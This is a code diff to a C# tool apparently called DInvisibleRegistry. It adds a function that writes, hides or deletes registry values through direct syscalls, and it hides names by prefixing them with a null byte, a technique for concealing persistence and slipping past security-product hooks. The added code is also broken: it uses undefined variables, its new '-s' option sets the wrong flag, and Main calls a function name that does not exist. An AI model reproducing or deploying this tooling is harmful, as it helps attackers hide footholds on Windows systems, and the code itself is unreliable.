@@ -39,6 +39,128 @@ namespace DInvisibleRegistry
             Console.WriteLine("Developed by @jean_maes_1994\n\n\n");
         }
 
+        
+
+
+ public static void DRegSys(String hive = "HKCU", String subKey = @"\SOFTWARE", String keyName = "", String keyValue = "", bool hiddenKey = false, bool deleteKey = false)
+        {
+            try
+            {
+                if (hive == "HKLM")
+                {
+                    hive = @"\Registry\Machine";
+                }
+                else if (hive == "HKCU")
+                {
+                    String sid = WindowsIdentity.GetCurrent().User.ToString();
+                    hive = @"\Registry\User\" + sid;
+                }
+                else
+                {
+                    throw new Exception("Hive needs to be either HKLM or HKCU");
+                }
+                if (hiddenKey)
+                {
+                    keyName = "\0" + keyName;
+                }
+                String regKey = hive + subKey;
+                IntPtr keyHandle = IntPtr.Zero;
+                STRUCTS.OBJECT_ATTRIBUTES oa = new STRUCTS.OBJECT_ATTRIBUTES();
+                DInvoke.Data.Native.UNICODE_STRING UC_RegKey = new DInvoke.Data.Native.UNICODE_STRING();
+                string SID = WindowsIdentity.GetCurrent().User.ToString();
+                DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKey, regKey);
+                IntPtr oaObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(UC_RegKey));
+                Marshal.StructureToPtr(UC_RegKey, oaObjectName, true);
+                oa.Length = Marshal.SizeOf(oa);
+                oa.Attributes = (uint)STRUCTS.OBJ_ATTRIBUTES.CASE_INSENSITIVE;
+                oa.objectName = oaObjectName;
+                oa.SecurityDescriptor = IntPtr.Zero;
+                oa.SecurityQualityOfService = IntPtr.Zero;
+                DInvoke.Data.Native.NTSTATUS retValue = new DInvoke.Data.Native.NTSTATUS();
+
+                object[] ntOpenKeyParams =
+                {
+                   rkeyHandle,desiredAccess,roa
+                };
+
+
+                    IntPtr syscall = IntPtr.Zero;
+
+                syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtOpenKey");
+
+                DELEGATES.NtOpenKey syscallNtOpenKey = (DELEGATES.NtOpenKey)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DELEGATES.NtOpenKey));
+
+                retValue = syscallNtOpenKey(ref keyHandle, desiredAccess, ref oa);
+
+
+                if (retValue == DInvoke.Data.Native.NTSTATUS.Success)
+                {
+                    Console.WriteLine("Handle to " + hive + " succesfully opened!");
+                    String keyValueName = keyName;
+                    String keyValueData = keyValue;
+                    DInvoke.Data.Native.UNICODE_STRING UC_RegKeyValueName = new DInvoke.Data.Native.UNICODE_STRING();
+                    DInvoke.Data.Native.UNICODE_STRING UC_RegKeyValueData = new DInvoke.Data.Native.UNICODE_STRING();
+                    if (!hiddenKey)
+                    {
+                        DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKeyValueName, keyValueName);
+                    }
+                    else
+                    {
+                        UC_RegKeyValueName.Length = (ushort)(keyValueName.Length * 2);
+                        UC_RegKeyValueName.MaximumLength = (ushort)(keyValueName.Length * 2);
+                        UC_RegKeyValueName.Buffer = Marshal.StringToCoTaskMemUni(keyValueName);
+                    }
+                    DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref UC_RegKeyValueData, keyValueData);
+                    if (!deleteKey)
+                    {
+                        syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtSetValueKey");
+
+                     DELEGATES.NtSetValueKey syscallNtSetValueKey = (DELEGATES.NtSetValueKey)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DELEGATES.NtSetValueKey));
+
+                        retValue = syscallNtSetValueKey(keyHandle, ref UC_RegKeyValueName, 0, STRUCTS.REGISTRY_TYPES.REG_SZ, UC_RegKeyValueData.Buffer, UC_RegKeyValueData.Length);
+                       
+                        if (retValue == DInvoke.Data.Native.NTSTATUS.Success)
+                        {
+                            Console.WriteLine("RegKey successfully set");
+                        }
+                    }
+                    else
+                    {
+                        object[] NtDeleteValueKeyParams =
+
+                       {
+                            keyHandle,UC_RegKeyValueName
+                       };
+
+                        
+                        syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtDeleteValueKey");
+
+                        DELEGATES.NtDeleteValueKey syscallNtDeleteValueKey = (DELEGATES.NtDeleteValueKey)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DELEGATES.NtDeleteValueKey));
+
+                        retValue = syscallNtDeleteValueKey(keyHandle, ref UC_RegKeyValueName);
+                        Console.WriteLine("key deletion status: " + retValue);
+                    }
+                    Marshal.FreeHGlobal(oa.objectName);
+                    object[] ntCloseParams = { keyHandle };
+                    syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtClose");
+
+                    DELEGATES.NtClose syscallNtClose = (DELEGATES.NtClose)Marshal.GetDelegateForFunctionPointer(syscall, typeof(DELEGATES.NtClose));
+
+                    syscallNtClose(keyHandle);
+                }
+                else { Console.WriteLine("Regkey not found"); }
+
+
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+
+
+        }
+        
+        
         public static void DRegHide(String hive = "HKCU", String subKey = @"\SOFTWARE", String keyName = "", String keyValue = "", bool hiddenKey = false, bool deleteKey = false)
         {
             try
@@ -355,6 +477,7 @@ namespace DInvisibleRegistry
                 { "n|normal","Uses the regular DInvoke method\n", o => normal = true},
                 { "m|manual|manual-map","Uses the manualmap method\n", o => manualmap = true},
                 { "o|deception","uses the overload method for deception\n", o => deception = true},
+                { "s|syscall","uses direct syscalls\n", o => deception = true},
                 { "?|help","Show Help\n", o => help = true },
                 {"h|reg-hide","hide the registry key using null byte magic\n", o => hideRegKey = true },
                 {"d|del|delreg","deletes given regkey\n", o => deleteRegKey = true },
@@ -382,6 +505,8 @@ namespace DInvisibleRegistry
                 { DRegHideManualMap(regHive, regSubTree, regKeyName, regKeyValue, hideRegKey, deleteRegKey); }
                 else if (deception)
                 { DRegHideWithDeception(regHive, regSubTree, regKeyName, regKeyValue, hideRegKey, deleteRegKey); }
+                else if (syscall)
+                { DRegHideSys(regHive, regSubTree, regKeyName, regKeyValue, hideRegKey, deleteRegKey); }  
                 else
                 { throw new ArgumentException("You got to specify a method with -n -m or -o"); }
             }
